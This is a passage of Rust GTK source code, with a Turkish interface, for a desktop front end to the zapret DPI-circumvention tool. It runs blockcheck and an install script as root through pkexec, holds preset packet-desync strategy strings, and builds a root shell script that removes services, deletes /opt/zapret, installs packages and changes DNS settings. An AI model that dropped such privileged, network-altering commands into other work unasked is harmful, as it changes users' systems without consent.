                                            match result {
                                                Ok(_) => {
                                                    reset_profile_ui_to_1(&curr_p_preset, &profile_btns_preset);
                                                    let loaded = load_profile_strategies(1);
                                                    populate_strategies_box(&list_box_timer, &loaded);
                                                    nav_mgmt_t.replace(&[page_mgmt_t.clone()]);
                                                },
                                                Err(e) => {
                                                    let dialog = adw::MessageDialog::builder()
                                                        .transient_for(&win_timer)
                                                        .heading(&t("Kurulum Hatası"))
                                                        .body(&t("Install script hatası: {}").replace("{}", &e.to_string()))
                                                        .build();
                                                    dialog.add_response("ok", &t("Tamam"));
                                                    dialog.present();
                                                }
                                            }
                                            glib::ControlFlow::Break
                                        },
                                        _ => glib::ControlFlow::Continue,
                                    }
                                },
                                Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                                Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                            }
                        });
                    },
                    Err(e) => {
                        let err = adw::MessageDialog::builder()
                            .transient_for(&win_err)
                            .heading(&t("Hata"))
                            .body(&t("Hazır stratejiler kaydedilemedi: {}").replace("{}", &e.to_string()))
                            .build();
                        err.add_response("ok", &t("Tamam"));
                        err.present();
                    }
                }
            } else {
                d.close();
            }
        });
        dialog.present();
    });

    let nav_view_clone_import_btn = nav_view.clone();
    let page_test_clone_import = page_test.clone();
    let lbl_test_clone_import = label_test_counter.clone();
    let lbl_title_import = label_test_title.clone();
    let lbl_info_import = label_test_info.clone();
    let pid_clone_import = current_pid.clone();
    let cf_clone_import = test_cancel_flag.clone();
    let nav_mgmt_import = nav_view_clone_mgmt.clone();
    let page_mgmt_import = page_mgmt_clone.clone();
    let list_mgmt_import = list_box_mgmt.clone();
    let curr_p_import_p2 = current_profile_id.clone();
    let profile_btns_import_p2 = profile_btns_rc.clone();
    import_button.connect_clicked(move |_| {
        let file_dialog = gtk::FileDialog::builder()
            .title(&t("Strateji Dosyası Seç"))
            .modal(true)
            .accept_label(&t("İçe Aktar"))
            .build();
        let filter = FileFilter::new();
        filter.set_name(Some(&t("JSON Dosyaları")));
        filter.add_pattern("*.json");
        let filters = gtk::gio::ListStore::new::<FileFilter>();
        filters.append(&filter);
        file_dialog.set_filters(Some(&filters));
        file_dialog.set_default_filter(Some(&filter));
        let win_for_dialog = window_clone_import.clone();
        let nav = nav_view_clone_import_btn.clone();
        let page = page_test_clone_import.clone();
        let lbl = lbl_test_clone_import.clone();
        let lbl_title = lbl_title_import.clone();
        let lbl_info = lbl_info_import.clone();
        let pid = pid_clone_import.clone();
        let cf = cf_clone_import.clone();
        let list_box_mgmt_import_timer = list_mgmt_import.clone();
        let nav_mgmt_import_timer = nav_mgmt_import.clone();
        let page_mgmt_import_timer = page_mgmt_import.clone();
        let curr_p_import_p2 = curr_p_import_p2.clone();
        let profile_btns_import_p2 = profile_btns_import_p2.clone();
        file_dialog.open(Some(&window_clone_import), None::<&gtk::gio::Cancellable>, move |result| {
            if let Ok(file) = result {
                if let Some(path) = file.path() {
                    match validate_and_copy_strategies(&path, 1) {
                        Ok(_) => {
                            cf.store(false, Ordering::Relaxed);
                            lbl_title.set_label(&t("Zapret Kuruluyor..."));
                            lbl_info.set_label(&t("Zapret dosyaları ve yapılandırması hazırlanıyor.\nLütfen bekleyiniz."));
                            lbl.set_label(&t("Kurulum hazırlanıyor..."));
                            nav.push(&page);
                            let (sender, receiver) = mpsc::channel();
                            let sender_thread = sender.clone();
                            let cf_thread = cf.clone();
                            thread::spawn(move || {
                                run_easy_install_script(sender_thread, cf_thread);
                            });
                            let nav_timer = nav.clone();
                            let win_timer = win_for_dialog.clone();
                            let pid_timer = pid.clone();
                            let lbl_timer = lbl.clone();
                            let list_box_mgmt_import_timer = list_box_mgmt_import_timer.clone();
                            let nav_mgmt_import_timer = nav_mgmt_import_timer.clone();
                            let page_mgmt_import_timer = page_mgmt_import_timer.clone();
                            let curr_p_import_p2 = curr_p_import_p2.clone();
                            let profile_btns_import_p2 = profile_btns_import_p2.clone();
                            glib::timeout_add_local(Duration::from_millis(50), move || {
                                match receiver.try_recv() {
                                    Ok(msg) => {
                                        match msg {
                                            TestMsg::Started(id) => {
                                                if let Ok(mut guard) = pid_timer.lock() {
                                                    *guard = Some(id);
                                                }
                                                glib::ControlFlow::Continue
                                            },
                                            TestMsg::Log(line) => {
                                                let short_log = if line.len() > 50 { format!("{}...", &line[..47]) } else { line };
                                                lbl_timer.set_label(&short_log);
                                                glib::ControlFlow::Continue
                                            },
                                            TestMsg::InstallFinished(result) => {
                                                if let Ok(mut guard) = pid_timer.lock() {
                                                    *guard = None;
                                                }
                                                nav_timer.pop();
                                                match result {
                                                    Ok(_) => {
                                                        reset_profile_ui_to_1(&curr_p_import_p2, &profile_btns_import_p2);
                                                        let loaded = load_profile_strategies(1);
                                                        populate_strategies_box(&list_box_mgmt_import_timer, &loaded);
                                                        nav_mgmt_import_timer.replace(&[page_mgmt_import_timer.clone()]);
                                                    },
                                                    Err(e) => {
                                                        let dialog = adw::MessageDialog::builder()
                                                            .transient_for(&win_timer)
                                                            .heading(&t("Kurulum Hatası"))
                                                            .body(&t("Install script hatası: {}").replace("{}", &e.to_string()))
                                                            .build();
                                                        dialog.add_response("ok", &t("Tamam"));
                                                        dialog.present();
                                                    }
                                                }
                                                glib::ControlFlow::Break
                                            },
                                            _ => glib::ControlFlow::Continue,
                                        }
                                    },
                                    Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                                    Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                                }
                            });
                        },
                        Err(e) => {
                            let err = adw::MessageDialog::builder()
                                .transient_for(&win_for_dialog)
                                .heading(&t("Hata"))
                                .body(&t("Dosya içe aktarılamadı: {}").replace("{}", &e.to_string()))
                                .build();
                            err.add_response("ok", &t("Tamam"));
                            err.present();
                        }
                    }
                }
            }
        });
    });
    let entries_container_read = entries_container.clone();
    let window_clone_msg = window.clone();
    let curr_p_finish_btn = current_profile_id.clone();
    let profile_btns_finish_btn = profile_btns_rc.clone();
    finish_button.connect_clicked(move |_| {
        let mut domains = Vec::new();
        let mut current_child = entries_container_read.first_child();
        while let Some(child) = current_child {
            if let Ok(entry) = child.clone().downcast::<Entry>() {
                let text = entry.text();
                if !text.is_empty() {
                    let domain = text.to_string();
                    if domain.starts_with("http://") || domain.starts_with("https://") || domain.starts_with("www.") {
                        let dialog = adw::MessageDialog::builder()
                            .transient_for(&window_clone_msg)
                            .heading(&t("Hatalı Alan Adı"))
                            .body(&t("'{}' geçerli bir alan adı formatı değil.\nLütfen 'http://', 'https://' veya 'www.' kullanmadan sadece alan adını girin (örnek: google.com).").replace("{}", &domain))
                            .build();
                        dialog.add_response("ok", &t("Tamam"));
                        dialog.present();
                        return;
                    }
                    domains.push(domain);
                }
            }
            current_child = child.next_sibling(); 
        }
        if domains.is_empty() {
            let dialog = adw::MessageDialog::builder()
                .transient_for(&window_clone_msg)
                .heading(&t("Hata"))
                .body(&t("Lütfen test edilecek en az bir alan adı girin."))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }
        let dialog = adw::MessageDialog::builder()
            .transient_for(&window_clone_msg)
            .heading(&t("Tarama Modu Seçin"))
            .body(&t("Blockcheck taraması için bir hız ve kapsam seviyesi belirleyin."))
            .build();
        dialog.add_response("quick", &t("Hızlı\n(1 Deneme, Quick)"));
        dialog.add_response("standard", &t("Normal\n(3 Deneme, Standard)"));
        dialog.add_response("force", &t("Detaylı\n(3 Deneme, Force)"));
        dialog.add_response("cancel", &t("Vazgeç"));
        dialog.set_response_appearance("standard", ResponseAppearance::Suggested);
        dialog.set_response_appearance("cancel", ResponseAppearance::Destructive);
        let cf = test_cancel_flag.clone();
        let nav = nav_view_clone_for_test.clone();
        let page = page_test_clone.clone();
        let lbl = label_test_counter_clone.clone();
        let lbl_title = label_test_title_clone.clone();
        let lbl_info = label_test_info_clone.clone();
        let pid = current_pid.clone(); 
        let win = window_clone_msg.clone();
        let d_list = domains.clone();
        let nav_mgmt = nav_view_clone_mgmt.clone();
        let page_mgmt = page_mgmt_clone.clone();
        let list_mgmt = list_box_mgmt.clone();
        let curr_p_finish = curr_p_finish_btn.clone();
        let profile_btns_finish = profile_btns_finish_btn.clone();
        dialog.connect_response(None, move |d: &adw::MessageDialog, response_id| {
            let (repeats, scan_level) = match response_id {
                "quick" => (1, "quick".to_string()),
                "standard" => (3, "standard".to_string()),
                "force" => (3, "force".to_string()),
                "cancel" | _ => { 
                    d.close(); 
                    return; 
                }
            };
            d.close();
            cf.store(false, Ordering::Relaxed);
            let cf_thread = cf.clone();
            let cf_install = cf.clone();
            lbl_title.set_label(&t("Stratejiler aranıyor..."));
            lbl_info.set_label(&t("Bu işlem internet hızınıza göre zaman alabilir.\nLütfen bekleyiniz."));
            lbl.set_label(&t("Denenen Stratejiler: 0"));
            nav.push(&page);
            let (sender, receiver) = mpsc::channel();
            let d_vec = d_list.clone();
            let sender_blockcheck = sender.clone();
            let sender_install = sender.clone();
            thread::spawn(move || {
                run_blockcheck_process(d_vec, repeats, scan_level, sender_blockcheck, cf_thread);
            });
            let pid_timer = pid.clone();
            let nav_timer = nav.clone();
            let lbl_timer = lbl.clone();
            let lbl_title_timer = lbl_title.clone();
            let lbl_info_timer = lbl_info.clone();
            let win_timer = win.clone();
            let list_box_mgmt_timer = list_mgmt.clone();
            let nav_mgmt_timer = nav_mgmt.clone();
            let page_mgmt_timer = page_mgmt.clone();
            let curr_p_finish = curr_p_finish.clone();
            let profile_btns_finish = profile_btns_finish.clone();
            let mut count = 0;
            glib::timeout_add_local(Duration::from_millis(50), move || {
                match receiver.try_recv() {
                    Ok(msg) => {
                        match msg {
                            TestMsg::Started(id) => {
                                if let Ok(mut guard) = pid_timer.lock() {
                                    *guard = Some(id);
                                }
                                glib::ControlFlow::Continue
                            },
                            TestMsg::ProgressTick => {
                                count += 1;
                                lbl_timer.set_label(&t("Denenen Stratejiler: {}").replace("{}", &count.to_string()));
                                glib::ControlFlow::Continue
                            },
                            TestMsg::Log(line) => {
                                let short_log = if line.len() > 50 { format!("{}...", &line[..47]) } else { line };
                                lbl_timer.set_label(&short_log);
                                glib::ControlFlow::Continue
                            },
                            TestMsg::Finished(result) => {
                                if let Ok(mut guard) = pid_timer.lock() {
                                    *guard = None;
                                }
                                match result {
                                    Ok(strategies) => {
                                        if let Err(e) = save_strategies_to_profile(1, &strategies) {
                                            let dialog = adw::MessageDialog::builder()
                                                .transient_for(&win_timer)
                                                .heading(&t("Kaydetme Hatası"))
                                                .body(&t("Dosya kaydedilemedi: {}").replace("{}", &e.to_string()))
                                                .build();
                                            dialog.add_response("ok", &t("Tamam"));
                                            dialog.connect_response(None, move |d, _| d.close());
                                            dialog.present();
                                            glib::ControlFlow::Break
                                        } else if strategies.is_empty() {
                                            let dialog = adw::MessageDialog::builder()
                                                .transient_for(&win_timer)
                                                .heading(&t("Strateji Bulunamadı"))
                                                .body(&t("Blockcheck tamamlandı ancak çalışan bir strateji bulunamadı."))
                                                .build();
                                            dialog.add_response("ok", &t("Tamam"));
                                            dialog.connect_response(None, move |d, _| d.close());
                                            dialog.present();
                                            nav_timer.pop();
                                            glib::ControlFlow::Break
                                        } else {
                                            lbl_title_timer.set_label(&t("Zapret Kuruluyor..."));
                                            lbl_info_timer.set_label(&t("Zapret dosyaları ve yapılandırması hazırlanıyor.\nLütfen bekleyiniz."));
                                            lbl_timer.set_label(&t("Kurulum hazırlanıyor..."));
                                            let s = sender_install.clone();
                                            let c = cf_install.clone();
                                            thread::spawn(move || {
                                                run_easy_install_script(s, c);
                                            });
                                            glib::ControlFlow::Continue
                                        }
                                    },
                                    Err(e) => {
                                         if e.to_string() != "İptal edildi" {
                                            let dialog = adw::MessageDialog::builder()
                                                .transient_for(&win_timer)
                                                .heading(&t("Strateji Bulma Hatası"))
                                                .body(&t("Blockcheck çalıştırılamadı: {}").replace("{}", &e.to_string()))
                                                .build();
                                            dialog.add_response("ok", &t("Tamam"));
                                            dialog.present();
                                         }
                                         nav_timer.pop();
                                         glib::ControlFlow::Break
                                    }
                                }
                            },
                            TestMsg::InstallFinished(result) => {
                                if let Ok(mut guard) = pid_timer.lock() {
                                    *guard = None;
                                }
                                match result {
                                    Ok(_) => {
                                        reset_profile_ui_to_1(&curr_p_finish, &profile_btns_finish);
                                        let loaded = load_profile_strategies(1);
                                        populate_strategies_box(&list_box_mgmt_timer, &loaded);
                                        delete_local_zapret_folder();
                                        nav_mgmt_timer.replace(&[page_mgmt_timer.clone()]);
                                    },
                                    Err(e) => {
                                        nav_timer.pop();
                                        let dialog = adw::MessageDialog::builder()
                                            .transient_for(&win_timer)
                                            .heading(&t("Kurulum Hatası"))
                                            .body(&t("Install script hatası: {}").replace("{}", &e.to_string()))
                                            .build();
                                        dialog.add_response("ok", &t("Tamam"));
                                        dialog.present();
                                    }
                                }
                                glib::ControlFlow::Break
                            }
                        }
                    },
                    Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                    Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                }
            });
        });
        dialog.present();
    });
    window.present();
}

fn validate_and_copy_strategies(path: &Path, target_profile_id: usize) -> io::Result<()> {
    let content = fs::read_to_string(path)?;
    let strategies = parse_strategies_strict(&content)
        .map_err(|err_msg| io::Error::new(io::ErrorKind::InvalidData, err_msg))?;
    save_profile_strategies(target_profile_id, &strategies)?;
    Ok(())
}
fn format_strategy_with_hostlist(strategy_str: &str) -> String {
    if strategy_str.contains("<HOSTLIST>") || strategy_str.contains("<HOSTLIST_NOAUTO>") {
        return strategy_str.to_string();
    }
    let parts: Vec<&str> = strategy_str.split("--new").collect();
    let formatted_parts: Vec<String> = parts.iter()
        .map(|p| {
            let trimmed = p.trim();
            if trimmed.is_empty() {
                String::new()
            } else {
                format!("{} <HOSTLIST>", trimmed)
            }
        })
        .filter(|p| !p.is_empty())
        .collect();
    formatted_parts.join(" --new ")
}

fn run_blockcheck_process(domains: Vec<String>, repeats: usize, scan_level: String, sender: mpsc::Sender<TestMsg>, cancel_flag: Arc<AtomicBool>) {
    let valid_domains: Vec<String> = domains
        .into_iter()
        .map(|d| d.trim().to_string())
        .filter(|d| !d.is_empty() && !d.starts_with("http://") && !d.starts_with("https://") && !d.starts_with("www."))
        .collect();
    if valid_domains.is_empty() {
        let err_msg = t("Geçerli test edilecek alan adı bulunamadı.");
        log_to_file(&format!("Error: {}", err_msg));
        let _ = sender.send(TestMsg::Finished(Err(io::Error::new(io::ErrorKind::InvalidInput, err_msg))));
        return;
    }

    let domains_str = valid_domains.join(" ");
    log_to_file(&format!("Blockcheck started. Level: {}, Repeat: {}, Domains: {}", scan_level, repeats, domains_str));

    let _ = Command::new("pkexec")
        .arg(get_zapret_control_path())
        .arg("stop")
        .output();

    let blockcheck_script = Path::new("/opt/zapret/blockcheck.sh");
    if !blockcheck_script.exists() {
        let err_msg = t("blockcheck.sh bulunamadı: {}").replace("{}", "/opt/zapret/blockcheck.sh");
        log_to_file(&format!("Error: {}", err_msg));
        let _ = sender.send(TestMsg::Finished(Err(io::Error::new(io::ErrorKind::NotFound, err_msg))));
        return;
    }
    println!("Executing blockcheck via zapret-control");
    log_to_file("Executing blockcheck via zapret-control");
    let mut child = match Command::new("pkexec")
        .arg(get_zapret_control_path())
        .arg("blockcheck")
        .arg(repeats.to_string())
        .arg(scan_level)
        .args(&valid_domains)
        .stdout(Stdio::piped()) 
        .spawn() {
            Ok(c) => c,
            Err(e) => {
                let _ = sender.send(TestMsg::Finished(Err(e)));
                return;
            }
        };
    let _ = sender.send(TestMsg::Started(child.id()));
    if let Some(stdout) = child.stdout.take() {
        let reader = BufReader::new(stdout);
        let mut full_output = String::new();
        for line_result in reader.lines() {
            if cancel_flag.load(Ordering::Relaxed) {
                println!("Thread: Cancel flag detected, stopping process.");
                log_to_file("Thread: Cancel flag detected, stopping process.");
                let _ = Command::new("pkexec")
                    .arg(get_zapret_control_path())
                    .arg("kill-pid")
                    .arg(child.id().to_string())
                    .output();
                let _ = child.kill();
                let _ = child.wait(); 
                return; 
            }
            match line_result {
                Ok(line) => {
                    println!("{}", line);
                    log_to_file(&line);
                    full_output.push_str(&line);
                    full_output.push('\n');
                    let trimmed = line.trim();
                    if trimmed.contains("ipv4") || trimmed.contains("ipv6") || trimmed.starts_with("- ") {
                        let _ = sender.send(TestMsg::ProgressTick);
                    }
                },
                Err(_) => break,
            }
        }
        let _ = child.wait();
        if cancel_flag.load(Ordering::Relaxed) {
            return;
        }
        let mut strategies = Vec::new();
        let strip_ansi = |s: &str| -> String {
            let mut res = String::new();
            let mut inside = false;
            for c in s.chars() {
                if c == '\x1b' { inside = true; }
                if !inside { res.push(c); }
                if inside && c == 'm' { inside = false; }
            }
            res
        };
        let clean_lines: Vec<String> = full_output.lines().map(|l| strip_ansi(l)).collect();
        let has_common = clean_lines.iter().any(|l| l.contains("* COMMON"));
        let target_header = if has_common { "* COMMON" } else { "* SUMMARY" };
        let mut parsing = false;
        for line in &clean_lines {
            let trimmed = line.trim();
            if trimmed.contains(target_header) {
                parsing = true;
                continue;
            }
            if parsing {
                if trimmed.starts_with("* ") {
                    break;
                }
                if trimmed.is_empty() {
                    continue;
                }
                if let Some(idx) = trimmed.find("nfqws ") {
                    if !trimmed.contains("checking") && !trimmed.contains(">>") && !trimmed.contains("not working") {
                        let strategy = trimmed[idx + 6..].trim().to_string();
                        if is_safe_strategy_param(&strategy) {
                            strategies.push(strategy);
                        }
                    }
                }
            }
        }
        if strategies.is_empty() && !parsing {
             for line in &clean_lines {
                let trimmed = line.trim();
                 if let Some(idx) = trimmed.find("nfqws ") {
                     if !trimmed.contains("checking") && !trimmed.contains(">>") && !trimmed.contains("not working") {
                        let strategy = trimmed[idx + 6..].trim().to_string();
                        if is_safe_strategy_param(&strategy) && !strategies.contains(&strategy) {
                            strategies.push(strategy);
                        }
                     }
                 }
             }
        }
        log_to_file(&format!("Blockcheck completed. {} strategies found.", strategies.len()));
        let _ = sender.send(TestMsg::Finished(Ok(strategies)));
    } else {
        log_to_file("Error: Could not get Blockcheck stdout.");
        let _ = sender.send(TestMsg::Finished(Err(io::Error::new(io::ErrorKind::Other, t("Stdout alınamadı.")))));
    }
}
fn run_easy_install_script(sender: mpsc::Sender<TestMsg>, cancel_flag: Arc<AtomicBool>) {
    let install_script = Path::new("/opt/zapret/install_easy.sh");
    if !install_script.exists() {
        let _ = sender.send(TestMsg::InstallFinished(Err(io::Error::new(io::ErrorKind::NotFound, t("install_easy.sh bulunamadı")))));
        return;
    }
    let mut child = match Command::new("pkexec")
        .arg(get_zapret_control_path())
        .arg("easy-install")
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit()) 
        .spawn() {
            Ok(c) => c,
            Err(e) => {
                let _ = sender.send(TestMsg::InstallFinished(Err(e)));
                return;
            }
        };
    let _ = sender.send(TestMsg::Started(child.id()));
    if let Some(stdout) = child.stdout.take() {
        let reader = BufReader::new(stdout);
        for line_result in reader.lines() {
            if cancel_flag.load(Ordering::Relaxed) {
                let _ = Command::new("pkexec")
                    .arg(get_zapret_control_path())
                    .arg("kill-pid")
                    .arg(child.id().to_string())
                    .output();
                let _ = child.kill();
                let _ = child.wait();
                return;
            }
            if let Ok(line) = line_result {
                println!("[INSTALL]: {}", line);
                log_to_file(&format!("[INSTALL]: {}", line));
                 let _ = sender.send(TestMsg::Log(line));
            }
        }
    }
    let status = child.wait();
    match status {
        Ok(s) if s.success() => {
             let _ = sender.send(TestMsg::InstallFinished(Ok(())));
        },
        Ok(s) => {
             let _ = sender.send(TestMsg::InstallFinished(Err(io::Error::new(io::ErrorKind::Other, t("Kurulum başarısız. Kod: {}").replace("{}", &s.code().unwrap_or(-1).to_string())))));
        },
        Err(e) => {
             let _ = sender.send(TestMsg::InstallFinished(Err(e)));
        }
    }
}
const DEFAULT_PRESET_STRATEGIES: &[&str] = &[
    "--filter-tcp=80 --dpi-desync=fake,multisplit --dpi-desync-split-pos=method+2 --dpi-desync-fooling=md5sig --new --filter-tcp=443 --dpi-desync=fake --dpi-desync-ttl=2 --dpi-desync-fooling=md5sig --filter-udp=443 --dpi-desync=fake --dpi-desync-ttl=2",
    "--dpi-desync=fake --dpi-desync-ttl=3 --dpi-desync-fooling=md5sig",
    "--dpi-desync=split2 --dpi-desync-split-pos=1 --dpi-desync-fooling=md5sig",
    "--filter-udp=443 --dpi-desync=fake --dpi-desync-repeats=6 --new --filter-tcp=443 --dpi-desync=fake,disorder2 --dpi-desync-split-pos=1 --dpi-desync-ttl=3 --dpi-desync-fooling=md5sig",
    "--dpi-desync=fake,split2 --dpi-desync-split-pos=method+2 --dpi-desync-fooling=md5sig",
    "--filter-tcp=443 --dpi-desync=fake,multisplit --dpi-desync-split-pos=1,midsld --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-ttl=3"
];

fn apply_preset_strategies_to_profile(profile_id: usize) -> io::Result<()> {
    let preset_vec: Vec<ProfileStrategy> = DEFAULT_PRESET_STRATEGIES.iter().map(|s| ProfileStrategy {
        strategy: s.to_string(),
        active: true,
    }).collect();
    save_profile_strategies(profile_id, &preset_vec)
}

fn save_strategies_to_profile(profile_id: usize, strategies: &[String]) -> io::Result<()> {
    let profile_strats: Vec<ProfileStrategy> = strategies.iter().map(|s| ProfileStrategy {
        strategy: s.clone(),
        active: false,
    }).collect();
    save_profile_strategies(profile_id, &profile_strats)
}
fn add_entry_row(container: &Box, add_btn: &Button, grab_focus: bool) {
    let entry = Entry::builder()
        .placeholder_text(&t("Alan adı girin..."))
        .build();
    let container_clone = container.clone();
    let add_btn_clone = add_btn.clone();
    entry.connect_activate(move |_| {
        add_entry_row(&container_clone, &add_btn_clone, true);
    });
    if add_btn.parent().is_some() {
        container.remove(add_btn);
    }
    container.append(&entry);
    container.append(add_btn);
    if grab_focus {
        entry.grab_focus();
    }
}

fn populate_hostlist_entries(container: &Box, add_btn: &Button, domains: &[String]) {
    while let Some(child) = container.first_child() {
        container.remove(&child);
    }
    if domains.is_empty() {
        add_entry_row(container, add_btn, false);
    } else {
        for d in domains {
            let entry = Entry::builder()
                .text(d)
                .placeholder_text(&t("Alan adı girin..."))
                .build();
            let container_clone = container.clone();
            let add_btn_clone = add_btn.clone();
            entry.connect_activate(move |_| {
                add_entry_row(&container_clone, &add_btn_clone, true);
            });
            container.append(&entry);
        }
        container.append(add_btn);
    }
}
fn check_processes() -> Vec<String> {
    let to_check = vec![
        "tpws", 
        "nfqws", 
        "dvtws", 
        "winws", 
        "goodbyedpi", 
        "openvpn", 
        "wireguard", 
        "zapret",
        "warp-svc",
        "protonvpn-app",
        "protonvpn",
        "mullvad-daemon",
        "tailscaled",
        "nordvpnd",
        "expressvpnd",
        "surfsharkd",
        "windscribe",
        "cyberghostvpnd",
        "openconnect",
        "vpnagentd"
    ];
    let mut found = Vec::new();
    for proc in to_check {
        let output = Command::new("pgrep")
            .arg("-x")
            .arg(proc)
            .output();
        if let Ok(out) = output {
            if out.status.success() {
                found.push(proc.to_string());
            }
        }
    }
    found
}
fn check_network_manager() -> bool {
    if Command::new("which").arg("nmcli").output().is_err() {
        return false;
    }
    if let Ok(output) = Command::new("nmcli").arg("general").arg("status").output() {
        if output.status.success() {
             let _out = String::from_utf8_lossy(&output.stdout);
             return true;
        }
    }
    false
}

fn run_installation(btn: Button, pb: ProgressBar, lbl: Label, placeholder: Label, dns_label: Label, overwrite: bool, is_complete_flag: Rc<Cell<bool>>, is_installing_flag: Rc<Cell<bool>>, pid_store: Arc<Mutex<Option<u32>>>, cancel_flag: Arc<AtomicBool>, cancel_flag_ui: Arc<AtomicBool>, set_dns: bool) {
    log_to_file(&format!("Installation command issued. Re-download: {}, Set DNS: {}", overwrite, set_dns));
    is_installing_flag.set(true);
    cancel_flag.store(false, Ordering::Relaxed);
    btn.set_sensitive(false);
    placeholder.set_visible(false);
    dns_label.set_visible(false);
    pb.set_visible(true);
    lbl.set_visible(true);
    btn.set_label(&t("İptal"));
    btn.remove_css_class("suggested-action");
    btn.remove_css_class("warning"); 
    btn.remove_css_class("error");   
    btn.add_css_class("destructive-action");
    btn.set_sensitive(true);
    let (sender, receiver) = mpsc::channel();
    let cancel_flag_thread = cancel_flag.clone();
    thread::spawn(move || {
        let _ = sender.send(AppMsg::Status("Sistem kontrol ediliyor...".to_string()));
        let mut root_commands = String::from("#!/bin/sh\nset -e\nexec 2>&1\nexec < /dev/null\n");
        let distro_id = get_distro_id();
        if cancel_flag_thread.load(Ordering::Relaxed) { return; }
        root_commands.push_str("systemctl stop zapret 2>/dev/null || true\n");
        root_commands.push_str("systemctl disable zapret 2>/dev/null || true\n");
        root_commands.push_str("systemctl disable zapret-custom 2>/dev/null || true\n");
        root_commands.push_str("rm -f /etc/systemd/system/zapret.service /etc/systemd/system/zapret-custom.service /lib/systemd/system/zapret.service 2>/dev/null || true\n");
        root_commands.push_str("systemctl daemon-reload 2>/dev/null || true\n");
        root_commands.push_str("rc-service zapret stop 2>/dev/null || true\n");
        root_commands.push_str("rc-update del zapret default 2>/dev/null || rc-update del zapret 2>/dev/null || true\n");
        root_commands.push_str("rm -f /etc/init.d/zapret 2>/dev/null || true\n");
        root_commands.push_str("sv down zapret 2>/dev/null || true\n");
        root_commands.push_str("rm -rf /var/service/zapret /etc/service/zapret /run/runit/service/zapret 2>/dev/null || true\n");
        root_commands.push_str("service zapret stop 2>/dev/null || /etc/init.d/zapret stop 2>/dev/null || true\n");
        root_commands.push_str("rm -f /etc/init.d/zapret /etc/rc.d/zapret /etc/dinit.d/zapret /etc/dinit.d/boot.d/zapret /etc/sv/zapret 2>/dev/null || true\n");
        root_commands.push_str("killall -9 nfqws tpws dvtws 2>/dev/null || pkill -9 -x nfqws 2>/dev/null || pkill -9 -x tpws 2>/dev/null || true\n");
        if overwrite {
            root_commands.push_str("echo \"STATUS:CLEANING\"\n");
            root_commands.push_str("rm -rf /opt/zapret 2>/dev/null || true\n");
        }
        if cancel_flag_thread.load(Ordering::Relaxed) { return; }
        let binary_deps = vec!["git", "curl", "ipset", "iptables", "make", "gcc", "dig", "dnscrypt-proxy"];
        let mut dep_install_commands = Vec::new();
        for dep in binary_deps {
             let check = Command::new("which").arg(dep).output();
             let installed = match check {
                Ok(output) => output.status.success(),
                Err(_) => false,
             };
             if !installed {
                 let install_parts = get_package_install_command(&distro_id, dep);
                 if !install_parts.is_empty() {
                     dep_install_commands.push(install_parts.join(" "));
                 }
             }
        }
        let lib_deps = vec!["zlib", "libnetfilter_queue", "libmnl", "libcap"];
        for lib in lib_deps {
             let distro_pkg = get_distro_package_name(&distro_id, lib);
             if !is_package_installed(&distro_id, &distro_pkg) {
                 let install_parts = get_package_install_command(&distro_id, lib);
                 if !install_parts.is_empty() {
                     dep_install_commands.push(install_parts.join(" "));
                 }
             }
        }
        if !dep_install_commands.is_empty() {
            root_commands.push_str("echo \"STATUS:INSTALLING_DEPS\"\n");
            match distro_id.as_str() {
                "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => {
                    root_commands.push_str("apt-get update\n");
                },
                "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => {
                    root_commands.push_str("pacman -Sy --noconfirm\n");
                },
                "fedora" | "nobara" => {
                    root_commands.push_str("dnf makecache\n");
                },
                "opensuse" | "opensuse-tumbleweed" | "opensuse-leap" | "suse" => {
                    root_commands.push_str("zypper refresh\n");
                },
                "alpine" => {
                    root_commands.push_str("apk update\n");
                },
                "void" => {
                    root_commands.push_str("xbps-install -S\n");
                },
                "gentoo" => {
                    root_commands.push_str("emerge --sync\n");
                },
                _ => {}
            }
            for cmd in dep_install_commands {
                root_commands.push_str(&format!("{}\n", cmd));
            }
        }
        if cancel_flag_thread.load(Ordering::Relaxed) { return; }
        root_commands.push_str("echo \"STATUS:CONFIGURING\"\n");
        let config_file = "/etc/dnscrypt-proxy/dnscrypt-proxy.toml";
        root_commands.push_str(&format!("if [ -f \"{}\" ]; then\n", config_file));
        root_commands.push_str(&format!("  sed -i \"40s/^listen_addresses = \\['127\\.0\\.0\\.1:53'\\]$/listen_addresses = ['127.0.0.1:53', '[::1]:53']/\" {}\n", config_file));
        root_commands.push_str("fi\n");
        if set_dns {
            root_commands.push_str("echo \"STATUS:SETTING_DNS\"\n");
            root_commands.push_str("if command -v nmcli >/dev/null 2>&1; then\n");
            root_commands.push_str("  ACTIVE_CON=$(nmcli -t -f NAME,DEVICE,STATE connection show --active | head -n1 | cut -d: -f1)\n");
            root_commands.push_str("  if [ -n \"$ACTIVE_CON\" ]; then\n");
            root_commands.push_str("    nmcli connection modify \"$ACTIVE_CON\" ipv4.dns \"1.1.1.1 1.0.0.1\"\n");
            root_commands.push_str("    nmcli connection modify \"$ACTIVE_CON\" ipv4.ignore-auto-dns yes\n");
            root_commands.push_str("  fi\n");
            root_commands.push_str("fi\n");
        }
        {
            root_commands.push_str("echo \"STATUS:FINALIZING\"\n");
            let init = get_init_system();
            if init == "openrc" {
                root_commands.push_str("rc-service NetworkManager restart\n");
                root_commands.push_str("rc-update add dnscrypt-proxy default\n");
                root_commands.push_str("rc-service dnscrypt-proxy start\n");
            }
            else if init == "runit" {
                root_commands.push_str("sv restart NetworkManager || true\n");
                root_commands.push_str("ln -sf /etc/sv/dnscrypt-proxy /var/service/\n");
                root_commands.push_str("sleep 5\n");
                root_commands.push_str("sv up dnscrypt-proxy || true\n");
            }
            else if init == "sysvinit" {
